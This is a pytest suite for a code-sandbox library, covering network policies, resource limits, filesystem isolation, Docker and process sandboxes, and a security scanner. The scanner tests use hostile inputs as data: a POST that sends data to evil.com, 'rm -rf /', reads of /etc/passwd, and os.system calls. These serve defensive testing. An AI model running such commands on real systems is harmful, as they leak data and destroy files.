"""Tests for lyra-sandbox — all modules, 100+ tests."""

from __future__ import annotations

import os
import tempfile

import pytest

from lyra_sandbox import (
    AIR_GAPPED,
    DEVELOPMENT,
    LOOPBACK_ONLY,
    UNRESTRICTED,
    AccessMode,
    AllowedPaths,
    BASH_RESTRICTED,
    CodeRequest,
    ContainerError,
    ContainerStatus,
    DefaultPolicy,
    DockerConfig,
    DockerSandbox,
    EMPTY_BOX,
    ExecutionEngine,
    ExecutionError,
    ExecutionMetrics,
    ExecutionPolicy,
    ExecutionResult,
    FilesystemConfig,
    FilesystemIsolation,
    FilesystemPolicy,
    FindingSeverity,
    ImageBuildStatus,
    ImageConfig,
    ImageManager,
    IsolationLevel,
    Language,
    MountPoint,
    MountType,
    NetworkAction,
    NetworkDirection,
    NetworkPolicy,
    NetworkPolicyManager,
    NetworkRule,
    NODE_SAFE,
    ProcessConfig,
    ProcessResult,
    ProcessSandbox,
    PYTHON_SAFE,
    QuotaStatus,
    ResourceLimiter,
    ResourceLimitError,
    ResourcePolicy,
    ResourceQuota,
    SandboxConfig,
    SandboxError,
    SandboxImage,
    SandboxInstance,
    SandboxManager,
    SandboxMetrics,
    SandboxStatus,
    SandboxType,
    ScanConfig,
    ScanResult,
    SecurityFinding,
    SecurityProfile,
    SecurityScanError,
    SecurityScanner,
    TimeoutError,
    ImageError,
    FilesystemError,
    NetworkError,
)


# ═══════════════════════════════════════════════════════════════════════════
# exceptions
# ═══════════════════════════════════════════════════════════════════════════


class TestExceptions:
    def test_sandbox_error(self):
        e = SandboxError("test error")
        assert str(e) == "test error"
        assert isinstance(e, Exception)

    def test_container_error(self):
        e = ContainerError("container failed")
        assert isinstance(e, SandboxError)

    def test_execution_error(self):
        e = ExecutionError("exec failed")
        assert isinstance(e, SandboxError)

    def test_resource_limit_error(self):
        e = ResourceLimitError("out of memory")
        assert isinstance(e, SandboxError)

    def test_network_error(self):
        e = NetworkError("network blocked")
        assert isinstance(e, SandboxError)

    def test_filesystem_error(self):
        e = FilesystemError("no access")
        assert isinstance(e, SandboxError)

    def test_image_error(self):
        e = ImageError("image not found")
        assert isinstance(e, SandboxError)

    def test_security_scan_error(self):
        e = SecurityScanError("dangerous code")
        assert isinstance(e, SandboxError)

    def test_timeout_error(self):
        e = TimeoutError("timed out")
        assert isinstance(e, SandboxError)


class TestLanguage:
    def test_values(self):
        assert Language.PYTHON.value == "python"
        assert Language.BASH.value == "bash"
        assert Language.GENERIC.value == "generic"

    def test_all_members(self):
        assert len(Language) == 6


class TestCodeRequest:
    def test_defaults(self):
        req = CodeRequest(code="print('hi')")
        assert req.code == "print('hi')"
        assert req.language == Language.GENERIC
        assert req.stdin == ""
        assert req.args == []
        assert req.expected_return_code == 0

    def test_custom(self):
        req = CodeRequest(
            code="print('hi')",
            language=Language.PYTHON,
            stdin="input",
            args=["-v"],
            expected_return_code=0,
        )
        assert req.language == Language.PYTHON
        assert req.stdin == "input"

    def test_immutable(self):
        req = CodeRequest(code="test")
        with pytest.raises(Exception):
            req.code = "changed"  # type: ignore[attr-defined]


class TestExecutionResult:
    def test_defaults(self):
        r = ExecutionResult(output="ok", stderr="", return_code=0, duration_ms=10.0)
        assert r.output == "ok"
        assert not r.timed_out
        assert not r.was_killed
        assert r.sandbox_type_used == "unknown"

    def test_full(self):
        r = ExecutionResult(
            output="done",
            stderr="",
            return_code=0,
            duration_ms=100.0,
            timed_out=True,
            was_killed=True,
            sandbox_type_used="docker",
        )
        assert r.timed_out
        assert r.was_killed
        assert r.sandbox_type_used == "docker"


# ═══════════════════════════════════════════════════════════════════════════
# network_policy
# ═══════════════════════════════════════════════════════════════════════════


class TestNetworkEnums:
    def test_direction_values(self):
        assert NetworkDirection.INGRESS.value == "ingress"
        assert NetworkDirection.EGRESS.value == "egress"
        assert NetworkDirection.BOTH.value == "both"

    def test_action_values(self):
        assert NetworkAction.ALLOW.value == "allow"
        assert NetworkAction.DENY.value == "deny"
        assert NetworkAction.LOG.value == "log"

    def test_default_policy(self):
        assert DefaultPolicy.DENY_ALL.value == "deny_all"
        assert DefaultPolicy.ALLOW_LIST.value == "allow_list"

    def test_isolation_level(self):
        assert IsolationLevel.FULL_ISOLATION.value == "full_isolation"
        assert IsolationLevel.RESTRICTED_NETWORK.value == "restricted_network"


class TestNetworkRule:
    def test_defaults(self):
        rule = NetworkRule()
        assert rule.action == NetworkAction.DENY
        assert rule.direction == NetworkDirection.EGRESS
        assert rule.protocol == "tcp"
        assert rule.rule_id is not None

    def test_custom(self):
        rule = NetworkRule(
            rule_id="r1",
            direction=NetworkDirection.INGRESS,
            action=NetworkAction.ALLOW,
            protocol="udp",
            port=53,
            cidr="10.0.0.0/8",
            domain="example.com",
        )
        assert rule.rule_id == "r1"
        assert rule.port == 53
        assert rule.domain == "example.com"


class TestNetworkPolicy:
    def test_air_gapped(self):
        assert AIR_GAPPED.default_action == DefaultPolicy.DENY_ALL
        assert len(AIR_GAPPED.rules) == 0

    def test_loopback_only(self):
        assert LOOPBACK_ONLY.default_action == DefaultPolicy.DENY_ALL
        assert len(LOOPBACK_ONLY.rules) == 1
        assert LOOPBACK_ONLY.rules[0].cidr == "127.0.0.0/8"

    def test_development(self):
        assert DEVELOPMENT.default_action == DefaultPolicy.ALLOW_LIST
        assert len(DEVELOPMENT.rules) == 3

    def test_unrestricted(self):
        assert UNRESTRICTED.default_action == DefaultPolicy.ALLOW_LIST

    def test_custom_policy(self):
        policy = NetworkPolicy(
            name="custom",
            default_action=DefaultPolicy.DENY_ALL,
            rules=(NetworkRule(action=NetworkAction.ALLOW, cidr="10.0.0.0/8"),),
        )
        assert policy.name == "custom"
        assert len(policy.rules) == 1


class TestNetworkPolicyManager:
    def setup_method(self):
        NetworkPolicyManager.clear_policies()

    def test_apply_and_remove_policy(self):
        assert NetworkPolicyManager.apply_policy(AIR_GAPPED)
        assert NetworkPolicyManager.remove_policy("air_gapped")

    def test_check_connection_denied(self):
        NetworkPolicyManager.apply_policy(AIR_GAPPED)
        result = NetworkPolicyManager.check_connection(
            "sandbox", "10.0.0.1", NetworkDirection.EGRESS
        )
        assert result == NetworkAction.DENY

    def test_check_connection_allowed_loopback(self):
        NetworkPolicyManager.apply_policy(LOOPBACK_ONLY)
        result = NetworkPolicyManager.check_connection(
            "sandbox", "127.0.0.1", NetworkDirection.EGRESS
        )
        assert result == NetworkAction.ALLOW

    def test_check_connection_development(self):
        NetworkPolicyManager.apply_policy(DEVELOPMENT)
        result = NetworkPolicyManager.check_connection(
            "sandbox", "93.184.216.34", NetworkDirection.EGRESS, port=443
        )
        assert result == NetworkAction.ALLOW

    def test_clear_policies(self):
        NetworkPolicyManager.apply_policy(AIR_GAPPED)
        NetworkPolicyManager.clear_policies()
        assert NetworkPolicyManager.get_isolation_level() == IsolationLevel.FULL_ISOLATION

    def test_get_isolation_level_air_gapped(self):
        NetworkPolicyManager.apply_policy(AIR_GAPPED)
        level = NetworkPolicyManager.get_isolation_level()
        assert level == IsolationLevel.FULL_ISOLATION

    def test_get_isolation_level_loopback(self):
        NetworkPolicyManager.apply_policy(LOOPBACK_ONLY)
        level = NetworkPolicyManager.get_isolation_level()
        assert level == IsolationLevel.LOOPBACK_ONLY

    def test_get_isolation_level_no_policies(self):
        level = NetworkPolicyManager.get_isolation_level()
        assert level == IsolationLevel.FULL_ISOLATION

    def test_remove_nonexistent_policy(self):
        assert not NetworkPolicyManager.remove_policy("nonexistent")


# ═══════════════════════════════════════════════════════════════════════════
# resource_limiter
# ═══════════════════════════════════════════════════════════════════════════


class TestResourceQuota:
    def test_defaults(self):
        q = ResourceQuota()
        assert q.cpu_shares == 1024
        assert q.memory_limit_bytes == 512 * 1024 * 1024
        assert q.disk_limit_bytes == 1024 * 1024 * 1024
        assert q.max_pids == 256
        assert q.max_open_files == 1024

    def test_custom(self):
        q = ResourceQuota(memory_limit_bytes=256 * 1024 * 1024, max_pids=128)
        assert q.memory_limit_bytes == 256 * 1024 * 1024
        assert q.max_pids == 128


class TestQuotaStatus:
    def test_within_limits(self):
        quota = ResourceQuota(memory_limit_bytes=1000)
        from lyra_sandbox.resource_limiter import ResourceUsage as ResUsage

        status = QuotaStatus(
            quota=quota,
            current=ResUsage(memory_bytes=500),
            within_limits=True,
        )
        assert status.within_limits
        assert len(status.exceeded_resources) == 0

    def test_exceeded(self):
        quota = ResourceQuota(memory_limit_bytes=100, max_pids=10)
        from lyra_sandbox.resource_limiter import ResourceUsage as ResUsage

        status = QuotaStatus(
            quota=quota,
            current=ResUsage(memory_bytes=500, pids=20),
            within_limits=False,
            exceeded_resources=("memory", "pids"),
        )
        assert not status.within_limits
        assert "memory" in status.exceeded_resources


class TestResourceLimiter:
    def test_get_current_usage(self):
        usage = ResourceLimiter.get_current_usage()
        assert isinstance(usage.cpu_percent, float)
        assert isinstance(usage.memory_bytes, int)

    def test_check_within_limits(self):
        quota = ResourceQuota(memory_limit_bytes=1_000_000, disk_limit_bytes=1_000_000)
        from lyra_sandbox.resource_limiter import ResourceUsage as ResUsage

        usage = ResUsage(memory_bytes=500, disk_bytes=100)
        status = ResourceLimiter.check_within_limits(usage, quota)
        assert status.within_limits

    def test_check_exceeded_memory(self):
        quota = ResourceQuota(memory_limit_bytes=100)
        from lyra_sandbox.resource_limiter import ResourceUsage as ResUsage

        usage = ResUsage(memory_bytes=500)
        status = ResourceLimiter.check_within_limits(usage, quota)
        assert not status.within_limits
        assert "memory" in status.exceeded_resources

    def test_apply_limits_returns_bool(self):
        result = ResourceLimiter.apply_limits(os.getpid(), ResourceQuota())
        assert isinstance(result, bool)

    def test_resource_policy_enum(self):
        assert ResourcePolicy.HARD_LIMIT.value == "hard_limit"
        assert ResourcePolicy.SOFT_LIMIT.value == "soft_limit"
        assert ResourcePolicy.MONITOR_ONLY.value == "monitor_only"


# ═══════════════════════════════════════════════════════════════════════════
# filesystem_isolation
# ═══════════════════════════════════════════════════════════════════════════


class TestMountTypes:
    def test_values(self):
        assert MountType.BIND.value == "bind"
        assert MountType.TMPFS.value == "tmpfs"
        assert MountType.VOLUME.value == "volume"
        assert MountType.OVERLAY.value == "overlay"


class TestMountPoint:
    def test_defaults(self):
        mp = MountPoint()
        assert mp.read_only
        assert mp.type == MountType.BIND

    def test_custom(self):
        mp = MountPoint(
            source="/src", target="/dst", read_only=False, type=MountType.TMPFS
        )
        assert mp.source == "/src"
        assert not mp.read_only
        assert mp.type == MountType.TMPFS


class TestFilesystemConfig:
    def test_defaults(self):
        cfg = FilesystemConfig()
        assert cfg.read_only_root
        assert cfg.tmpfs_size_mb == 64

    def test_custom(self):
        mp = MountPoint(source="/src", target="/dst")
        cfg = FilesystemConfig(mounts=(mp,), tmpfs_size_mb=128)
        assert len(cfg.mounts) == 1
        assert cfg.tmpfs_size_mb == 128


class TestFilesystemPolicy:
    def test_default_allowed_read(self):
        policy = FilesystemPolicy()
        assert len(policy.allowed_read_paths) > 0


class TestAllowedPaths:
    def test_empty_always_allows_read(self):
        ap = AllowedPaths(allowed=("/tmp",))
        assert ap.is_allowed("/any/path", AccessMode.READ)

    def test_write_restricted(self):
        ap = AllowedPaths(allowed=("/tmp/writeable",))
        assert not ap.is_allowed("/etc/passwd", AccessMode.WRITE)


class TestFilesystemIsolation:
    def test_create_workspace(self):
        path = FilesystemIsolation.create_workspace()
        assert os.path.isdir(path)
        assert path.startswith(tempfile.gettempdir())
        FilesystemIsolation.cleanup_workspace(path)

    def test_cleanup_workspace(self):
        path = FilesystemIsolation.create_workspace()
        assert FilesystemIsolation.cleanup_workspace(path)
        assert not os.path.isdir(path)

    def test_cleanup_nonexistent(self):
        result = FilesystemIsolation.cleanup_workspace("/nonexistent/path")
        assert result

    def test_validate_path_access(self):
        assert FilesystemIsolation.validate_path_access("/tmp/test", AccessMode.READ)
        assert not FilesystemIsolation.validate_path_access("/etc/shadow", AccessMode.WRITE)

    def test_validate_path_read_always_allowed(self):
        assert FilesystemIsolation.validate_path_access("/etc/passwd", AccessMode.READ)

    def test_cleanup_all(self):
        p1 = FilesystemIsolation.create_workspace()
        p2 = FilesystemIsolation.create_workspace()
        FilesystemIsolation.cleanup_all()
        assert not os.path.isdir(p1)
        assert not os.path.isdir(p2)

    def test_access_mode_values(self):
        assert AccessMode.READ.value == "read"
        assert AccessMode.WRITE.value == "write"
        assert AccessMode.EXECUTE.value == "execute"

    def test_with_mounts(self):
        workspace = FilesystemIsolation.create_workspace()
        mp = MountPoint(source="/tmp", target="/tmp", read_only=True)
        result = FilesystemIsolation.with_mounts(
            workspace, mounts=(mp,), read_only_root=True
        )
        assert os.path.isdir(os.path.join(workspace, "mnt"))
        FilesystemIsolation.cleanup_workspace(workspace)


# ═══════════════════════════════════════════════════════════════════════════
# security_scanner
# ═══════════════════════════════════════════════════════════════════════════


class TestFindingSeverity:
    def test_values(self):
        assert FindingSeverity.CRITICAL.value == "critical"
        assert FindingSeverity.HIGH.value == "high"
        assert FindingSeverity.MEDIUM.value == "medium"
        assert FindingSeverity.LOW.value == "low"
        assert FindingSeverity.INFO.value == "info"


class TestSecurityFinding:
    def test_creation(self):
        f = SecurityFinding(
            line_number=5,
            severity=FindingSeverity.HIGH,
            pattern="eval(",
            description="eval detected",
            recommendation="use safer alternative",
        )
        assert f.line_number == 5
        assert f.pattern == "eval("
        assert f.recommendation != ""


class TestScanResult:
    def test_passed(self):
        r = ScanResult(passed=True)
        assert r.passed
        assert r.risk_score == 0.0

    def test_failed(self):
        r = ScanResult(
            passed=False,
            risk_score=0.8,
            findings=(SecurityFinding(line_number=1, severity=FindingSeverity.CRITICAL, pattern="os.system", description="bad"),),
            blocked_patterns=("os.system",),
        )
        assert not r.passed
        assert r.risk_score == 0.8
        assert len(r.findings) == 1
        assert "os.system" in r.blocked_patterns


class TestScanConfig:
    def test_defaults(self):
        cfg = ScanConfig()
        assert cfg.enabled
        assert cfg.strict_mode
        assert cfg.auto_block_critical


class TestSecurityScanner:
    def test_scan_safe_code(self):
        result = SecurityScanner.scan_code(
            code="print('hello world')",
            language=Language.PYTHON,
        )
        assert result.passed
        assert len(result.findings) == 0

    def test_scan_dangerous_import(self):
        result = SecurityScanner.scan_code(
            code="import subprocess\nsubprocess.run(['ls'])",
            language=Language.PYTHON,
        )
        assert not result.passed
        assert any("subprocess" in f.pattern for f in result.findings)

    def test_scan_eval(self):
        result = SecurityScanner.scan_code(
            code="eval('2 + 2')",
            language=Language.PYTHON,
        )
        assert not result.passed

    def test_scan_os_system(self):
        result = SecurityScanner.scan_code(
            code="import os\nos.system('ls')",
            language=Language.PYTHON,
        )
        assert not result.passed

    def test_scan_open_etc(self):
        result = SecurityScanner.scan_code(
            code="open('/etc/passwd')",
            language=Language.PYTHON,
        )
        assert not result.passed

    def test_scan_empty_code(self):
        result = SecurityScanner.scan_code(code="", language=Language.PYTHON)
        assert result.passed

    def test_scan_blank_code(self):
        result = SecurityScanner.scan_code(code="  ", language=Language.PYTHON)
        assert result.passed

    def test_scan_bash_code(self):
        result = SecurityScanner.scan_code(
            code="rm -rf /",
            language=Language.BASH,
        )
        assert result.passed  # BASH doesn't do AST analysis

    def test_scan_dependencies_safe(self):
        result = SecurityScanner.scan_dependencies(["numpy", "requests"])
        assert result.passed

    def test_scan_dependencies_dangerous(self):
        result = SecurityScanner.scan_dependencies(["pwn-tools", "requests"])
        assert not result.passed

    def test_scan_requests_post_blocked(self):
        result = SecurityScanner.scan_code(
            code="requests.post('http://evil.com', data={})",
            language=Language.PYTHON,
        )
        assert not result.passed

    def test_scan_syntax_error(self):
        result = SecurityScanner.scan_code(
            code="def broken(",
            language=Language.PYTHON,
        )
        assert not result.passed
        assert any(f.pattern == "syntax_error" for f in result.findings)

    def test_scan_socket(self):
        result = SecurityScanner.scan_code(
            code="socket.socket()",
            language=Language.PYTHON,
        )
        assert not result.passed

    def test_scan_ctypes(self):
        result = SecurityScanner.scan_code(
            code="ctypes.CDLL('libc.so.6')",
            language=Language.PYTHON,
        )
        assert not result.passed


# ═══════════════════════════════════════════════════════════════════════════
# image_manager
# ═══════════════════════════════════════════════════════════════════════════


class TestImageBuildStatus:
    def test_values(self):
        assert ImageBuildStatus.BUILDING.value == "building"
        assert ImageBuildStatus.READY.value == "ready"
        assert ImageBuildStatus.FAILED.value == "failed"
        assert ImageBuildStatus.CACHED.value == "cached"


class TestSandboxImage:
    def test_defaults(self):
        img = SandboxImage(image_id="i1", name="test")
        assert img.tag == "latest"
        assert img.base == "alpine:latest"
        assert img.packages == ()
        assert img.size_mb == 0.0

    def test_full(self):
        img = SandboxImage(
            image_id="i2",
            name="safe-python",
            tag="v1",
            base="python:3.11",
            packages=("numpy",),
            size_mb=150.0,
            hash="abc123",
        )
        assert img.tag == "v1"
        assert img.hash == "abc123"


class TestImageConfig:
    def test_defaults(self):
        cfg = ImageConfig()
        assert cfg.base_image == "alpine:latest"
        assert cfg.packages == ()
        assert cfg.entrypoint == "/bin/sh"

    def test_custom(self):
        cfg = ImageConfig(
            base_image="ubuntu:22.04",
            packages=("curl", "git"),
            env_vars=(("DEBIAN_FRONTEND", "noninteractive"),),
            entrypoint="/bin/bash",
            work_dir="/app",
        )
        assert cfg.base_image == "ubuntu:22.04"
        assert cfg.entrypoint == "/bin/bash"
        assert cfg.work_dir == "/app"


class TestPrebuiltImages:
    def test_python_safe(self):
        assert "python" in PYTHON_SAFE.base_image
        assert "numpy" in PYTHON_SAFE.packages

    def test_node_safe(self):
        assert "node" in NODE_SAFE.base_image
        assert NODE_SAFE.entrypoint == "node"

    def test_bash_restricted(self):
        assert "bash" in BASH_RESTRICTED.packages
        assert BASH_RESTRICTED.entrypoint == "/bin/bash"

    def test_empty_box(self):
        assert EMPTY_BOX.base_image == "scratch"


class TestImageManager:
    def setup_method(self):
        ImageManager.clear_images()

    def test_build_image(self):
        config = ImageConfig(base_image="alpine:3.18")
        image = ImageManager.build_image(config)
        assert image.image_id.startswith("lyra-")
        assert image.base == "alpine:3.18"
        assert ImageManager.get_build_status(image.image_id) == ImageBuildStatus.READY

    def test_build_dedup(self):
        config = ImageConfig(base_image="alpine:3.18")
        img1 = ImageManager.build_image(config)
        img2 = ImageManager.build_image(config)
        assert img1.image_id == img2.image_id

    def test_cache_image(self):
        img = SandboxImage(image_id="cached-1", name="test", hash="xyz")
        assert ImageManager.cache_image(img)
        assert ImageManager.get_build_status("cached-1") == ImageBuildStatus.CACHED

    def test_get_image(self):
        config = ImageConfig(base_image="debian:12")
        built = ImageManager.build_image(config)
        retrieved = ImageManager.get_image(built.image_id)
        assert retrieved is not None
        assert retrieved.image_id == built.image_id

    def test_get_nonexistent_image(self):
        assert ImageManager.get_image("nonexistent") is None

    def test_list_images(self):
        ImageManager.build_image(ImageConfig(base_image="alpine:3.18"))
        ImageManager.build_image(ImageConfig(base_image="ubuntu:22.04"))
        assert len(ImageManager.list_images()) == 2

    def test_remove_image(self):
        config = ImageConfig(base_image="alpine:3.18")
        built = ImageManager.build_image(config)
        assert ImageManager.remove_image(built.image_id)
        assert ImageManager.get_image(built.image_id) is None

    def test_get_build_status_nonexistent(self):
        assert ImageManager.get_build_status("nope") is None

    def test_clear_images(self):
        ImageManager.build_image(ImageConfig())
        ImageManager.clear_images()
        assert len(ImageManager.list_images()) == 0


# ═══════════════════════════════════════════════════════════════════════════
# process_sandbox
# ═══════════════════════════════════════════════════════════════════════════


class TestProcessConfig:
    def test_defaults(self):
        cfg = ProcessConfig(command=("echo", "hi"))
        assert cfg.timeout == 30
        assert cfg.work_dir == ""
        assert cfg.env_vars == ()

    def test_custom(self):
        cfg = ProcessConfig(
            command=("python3", "-c", "print('hi')"),
            work_dir="/tmp",
            env_vars=(("PYTHONUNBUFFERED", "1"),),
            timeout=60,
        )
        assert cfg.timeout == 60
        assert len(cfg.env_vars) == 1


class TestProcessResult:
    def test_defaults(self):
        r = ProcessResult(stdout="out", stderr="", exit_code=0, duration=0.5)
        assert r.stdout == "out"
        assert r.exit_code == 0
        assert not r.was_killed

    def test_failed_execution(self):
        r = ProcessResult(
            stdout="",
            stderr="error",
            exit_code=1,
            duration=0.1,
            was_killed=True,
        )
        assert r.exit_code == 1
        assert r.was_killed


class TestProcessSandbox:
    def test_execute_success(self):
        result = ProcessSandbox.execute(
            ProcessConfig(command=("echo", "hello sandbox"))
        )
        assert "hello sandbox" in result.stdout
        assert result.exit_code == 0

    def test_execute_failure(self):
        result = ProcessSandbox.execute(
            ProcessConfig(command=("false",))
        )
        assert result.exit_code != 0

    def test_execute_with_env(self):
        result = ProcessSandbox.execute(
            ProcessConfig(
                command=("sh", "-c", "echo $MY_VAR"),
                env_vars=(("MY_VAR", "test_value"),),
            )
        )
        assert "test_value" in result.stdout

    def test_execute_timeout(self):
        result = ProcessSandbox.execute(
            ProcessConfig(command=("sleep", "10"), timeout=1)
        )
        assert result.was_killed

    def test_execute_with_limits(self):
        result = ProcessSandbox.execute_with_limits(
            ProcessConfig(command=("echo", "limited"))
        )
        assert "limited" in result.stdout
        assert result.exit_code == 0

    def test_execute_no_such_command(self):
        result = ProcessSandbox.execute(
            ProcessConfig(command=("nonexistent_cmd_xyz",))
        )
        assert result.exit_code != 0

    def test_process_result_immutable(self):
        r = ProcessResult(stdout="a", stderr="", exit_code=0, duration=0.1)
        with pytest.raises(Exception):
            r.stdout = "b"  # type: ignore[attr-defined]


# ═══════════════════════════════════════════════════════════════════════════
# docker_sandbox
# ═══════════════════════════════════════════════════════════════════════════


class TestContainerStatus:
    def test_values(self):
        assert ContainerStatus.CREATED.value == "created"
        assert ContainerStatus.RUNNING.value == "running"
        assert ContainerStatus.EXITED.value == "exited"
        assert ContainerStatus.DEAD.value == "dead"


class TestSecurityProfile:
    def test_defaults(self):
        sp = SecurityProfile()
        assert sp.no_new_privileges
        assert sp.read_only_rootfs
        assert sp.cap_drop_all
        assert sp.user_namespace


class TestDockerConfig:
    def test_defaults(self):
        cfg = DockerConfig()
        assert cfg.image == "alpine:latest"
        assert cfg.network == "none"
        assert not cfg.privileged

    def test_custom(self):
        cfg = DockerConfig(
            image="python:3.11",
            command=("python", "-c", "print(1)"),
            network="bridge",
        )
        assert cfg.image == "python:3.11"
        assert cfg.network == "bridge"


class TestDockerSandbox:
    def setup_method(self):
        DockerSandbox.clear_all()

    def test_create_container(self):
        cid = DockerSandbox.create_container(DockerConfig())
        assert len(cid) == 12
        assert DockerSandbox.get_status(cid) == ContainerStatus.CREATED

    def test_start_container(self):
        cid = DockerSandbox.create_container(DockerConfig())
        assert DockerSandbox.start_container(cid)
        assert DockerSandbox.get_status(cid) == ContainerStatus.RUNNING

    def test_start_nonexistent_container(self):
        with pytest.raises(ContainerError):
            DockerSandbox.start_container("nonexistent")

    def test_execute_in_container(self):
        cid = DockerSandbox.create_container(DockerConfig())
        DockerSandbox.start_container(cid)
        result = DockerSandbox.execute_in_container(cid, "echo hello")
        assert result.return_code == 0
        assert cid in result.output

    def test_execute_in_stopped_container(self):
        cid = DockerSandbox.create_container(DockerConfig())
        result = DockerSandbox.execute_in_container(cid, "echo hello")
        assert result.return_code == 1
        assert "not running" in result.stderr

    def test_execute_in_nonexistent_container(self):
        with pytest.raises(ContainerError):
            DockerSandbox.execute_in_container("nope", "echo")

    def test_stop_container(self):
        cid = DockerSandbox.create_container(DockerConfig())
        DockerSandbox.start_container(cid)
        assert DockerSandbox.stop_container(cid)
        assert DockerSandbox.get_status(cid) == ContainerStatus.EXITED

    def test_stop_nonexistent(self):
        assert not DockerSandbox.stop_container("nope")

    def test_remove_container(self):
        cid = DockerSandbox.create_container(DockerConfig())
        assert DockerSandbox.remove_container(cid)
        assert DockerSandbox.get_status(cid) is None

    def test_get_container_logs(self):
        cid = DockerSandbox.create_container(DockerConfig())
        DockerSandbox.start_container(cid)
        DockerSandbox.execute_in_container(cid, "cmd1")
        DockerSandbox.execute_in_container(cid, "cmd2")
        logs = DockerSandbox.get_container_logs(cid)
        assert "cmd1" in logs
        assert "cmd2" in logs

    def test_list_containers(self):
        DockerSandbox.create_container(DockerConfig())
        DockerSandbox.create_container(DockerConfig())
        assert len(DockerSandbox.list_containers()) == 2

    def test_clear_all(self):
        DockerSandbox.create_container(DockerConfig())
        DockerSandbox.clear_all()
        assert len(DockerSandbox.list_containers()) == 0


# ═══════════════════════════════════════════════════════════════════════════
# execution_engine
# ═══════════════════════════════════════════════════════════════════════════


class TestExecutionPolicy:
    def test_defaults(self):
        p = ExecutionPolicy()
        assert Language.PYTHON in p.allowed_languages
        assert p.max_code_length == 100_000
        assert p.require_review

    def test_custom(self):
        p = ExecutionPolicy(
            allowed_languages=(Language.BASH,),
            max_code_length=1000,
            forbidden_patterns=("rm -rf",),
        )
        assert len(p.allowed_languages) == 1
        assert "rm -rf" in p.forbidden_patterns


class TestExecutionMetrics:
    def test_defaults(self):
        m = ExecutionMetrics()
        assert m.total == 0
        assert m.success == 0
        assert m.avg_duration == 0.0

    def test_custom(self):
        m = ExecutionMetrics(total=10, success=8, timeout=2, killed=1, avg_duration=0.5)
        assert m.avg_duration == 0.5
        assert m.success == 8


class TestExecutionEngine:
    def setup_method(self):
        self.engine = ExecutionEngine()

    def test_execute_safe_code(self):
        result = self.engine.execute(
            CodeRequest(code="print('hi')", language=Language.PYTHON),
            sandbox_type="process",
        )
        assert "hi" in result.output
        assert result.return_code == 0

    def test_execute_bash(self):
        result = self.engine.execute(
            CodeRequest(code="echo hello", language=Language.BASH),
        )
        assert "hello" in result.output

    def test_execute_code_too_long(self):
        engine = ExecutionEngine(
            policy=ExecutionPolicy(max_code_length=10)
        )
        with pytest.raises(ExecutionError):
            engine.execute(
                CodeRequest(code="x" * 20, language=Language.GENERIC),
            )

    def test_execute_disallowed_language(self):
        engine = ExecutionEngine(
            policy=ExecutionPolicy(allowed_languages=(Language.PYTHON,))
        )
        with pytest.raises(ExecutionError):
            engine.execute(
                CodeRequest(code="echo hi", language=Language.BASH),
            )

    def test_execute_security_blocked(self):
        with pytest.raises(SecurityScanError):
            self.engine.execute(
                CodeRequest(code="import subprocess\nsubprocess.run(['ls'])"),
            )

    def test_batch_execute(self):
        results = self.engine.batch_execute([
            CodeRequest(code="print('a')", language=Language.PYTHON),
            CodeRequest(code="print('b')", language=Language.PYTHON),
        ])
        assert len(results) == 2
        assert results[0].return_code == 0
        assert results[1].return_code == 0

    def test_batch_execute_with_failure(self):
        results = self.engine.batch_execute([
            CodeRequest(code="import subprocess\nsubprocess.run(['ls'])"),
            CodeRequest(code="print('b')", language=Language.PYTHON),
        ])
        assert len(results) == 2
        assert results[0].return_code == 1  # security failure
        assert "Security scan failed" in results[0].stderr

    def test_get_metrics_after_execution(self):
        self.engine.execute(
            CodeRequest(code="print('hi')", language=Language.PYTHON),
        )
        metrics = self.engine.get_metrics()
        assert metrics.total == 1
        assert metrics.success == 1

    def test_execution_count(self):
        assert self.engine.execution_count == 0
        self.engine.execute(
            CodeRequest(code="print('a')", language=Language.PYTHON),
        )
        assert self.engine.execution_count == 1

    def test_docker_sandbox_execution(self):
        result = self.engine.execute(
            CodeRequest(code="print('docker test')", language=Language.PYTHON),
            sandbox_type="docker",
        )
        assert result.sandbox_type_used == "docker"
        assert result.return_code == 0

    def test_execute_generic(self):
        result = self.engine.execute(
            CodeRequest(code="echo hello", language=Language.GENERIC),
        )
        assert result.return_code == 0


# ═══════════════════════════════════════════════════════════════════════════
# sandbox_manager
# ═══════════════════════════════════════════════════════════════════════════


class TestSandboxType:
    def test_values(self):
        assert SandboxType.PROCESS.value == "process"
        assert SandboxType.DOCKER.value == "docker"
        assert SandboxType.GVISOR.value == "gvisor"
        assert SandboxType.FIRECRACKER.value == "firecracker"
        assert SandboxType.REMOTE.value == "remote"


class TestSandboxStatus:
    def test_values(self):
        assert SandboxStatus.CREATING.value == "creating"
        assert SandboxStatus.RUNNING.value == "running"
        assert SandboxStatus.TERMINATED.value == "terminated"
        assert SandboxStatus.ERROR.value == "error"


class TestSandboxConfig:
    def test_defaults(self):
        cfg = SandboxConfig()
        assert cfg.sandbox_type == SandboxType.PROCESS
        assert cfg.timeout_seconds == 30
        assert cfg.max_memory_mb == 512

    def test_custom(self):
        cfg = SandboxConfig(
            sandbox_type=SandboxType.DOCKER,
            timeout_seconds=60,
            max_memory_mb=1024,
            max_cpu=4,
        )
        assert cfg.sandbox_type == SandboxType.DOCKER
        assert cfg.max_cpu == 4


class TestSandboxInstance:
    def test_creation(self):
        import time
        inst = SandboxInstance(
            instance_id="test-1",
            sandbox_type=SandboxType.PROCESS,
            status=SandboxStatus.RUNNING,
        )
        assert inst.instance_id == "test-1"
        assert inst.status == SandboxStatus.RUNNING

    def test_immutable(self):
        inst = SandboxInstance(
            instance_id="i1",
            sandbox_type=SandboxType.PROCESS,
            status=SandboxStatus.RUNNING,
        )
        with pytest.raises(Exception):
            inst.status = SandboxStatus.TERMINATED  # type: ignore[attr-defined]


class TestSandboxMetrics:
    def test_defaults(self):
        m = SandboxMetrics()
        assert m.active_instances == 0
        assert m.total_executions == 0
        assert m.avg_execution_time == 0.0

    def test_custom(self):
        m = SandboxMetrics(active_instances=5, total_executions=100, avg_execution_time=0.5)
        assert m.active_instances == 5


class TestSandboxManager:
    def setup_method(self):
        SandboxManager.clear_all()

    def test_create_sandbox(self):
        instance = SandboxManager.create_sandbox()
        assert instance.status == SandboxStatus.RUNNING
        assert instance.instance_id is not None

    def test_create_sandbox_with_config(self):
        cfg = SandboxConfig(sandbox_type=SandboxType.DOCKER)
        instance = SandboxManager.create_sandbox(cfg)
        assert instance.sandbox_type == SandboxType.DOCKER

    def test_execute_in_sandbox(self):
        inst = SandboxManager.create_sandbox()
        result = SandboxManager.execute(
            inst.instance_id,
            "print('hello from sandbox')",
            language="python",
        )
        assert result.return_code == 0
